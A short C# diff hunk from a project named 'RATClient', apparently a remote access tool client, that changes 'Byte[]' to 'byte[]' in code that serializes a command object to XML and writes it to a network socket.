@@ -104,7 +104,7 @@ namespace RATClient
                 c.Args = args;
             }
             NetworkStream nstream = sock.GetStream();
-            Byte[] sendBytes = Encoding.ASCII.GetBytes(SerializeToXml(c));
+            byte[] sendBytes = Encoding.ASCII.GetBytes(SerializeToXml(c));
             nstream.Write(sendBytes, 0, sendBytes.Length);
             nstream.Flush();
             byte[] message = new byte[sock.ReceiveBufferSize + 1];
